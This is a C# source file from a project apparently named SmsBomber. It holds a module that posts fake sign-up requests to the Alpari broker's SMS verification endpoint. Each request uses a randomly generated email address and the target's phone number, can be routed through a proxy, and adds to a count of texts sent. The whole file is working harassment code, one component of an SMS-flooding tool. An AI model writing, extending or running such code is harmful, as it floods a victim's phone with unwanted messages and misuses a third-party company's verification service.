using Leaf.xNet;
using static SmsBomber.ReturnTypes;

namespace SmsBomber.SmsService.Sites
{
    internal class Alpari
    {
        public static ResponseSendSms SendSms()
        {
            using (var request = new HttpRequest())
            {
                if(!string.IsNullOrWhiteSpace(Globals.WorkingData.ProxyAdress)) { request.Proxy = ProxyClient.Parse(Globals.WorkingData.ProxyTypeLeaf, Globals.WorkingData.ProxyAdress); }
                try
                {
                    request.Post($"{DomainList.Alpari}/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/", $"{{\"client_type\": \"personal\", \"email\": \"{Methods.GenerateRandomPassword(10)}@gmail.ru\", \"mobile_phone\": \"{Globals.WorkingData.PhoneNumber}\", \"deliveryOption\": \"sms\"}}", "application/json").ToString();
                }
                catch
                {
                    return new ResponseSendSms { FailedConnected = !request.HttpIsConnected(), SuccessSend = false };
                }
                Globals.WorkingStats.CountSendingSms++;
                return  new ResponseSendSms { SuccessSend = true };
            }
        }
    }
}
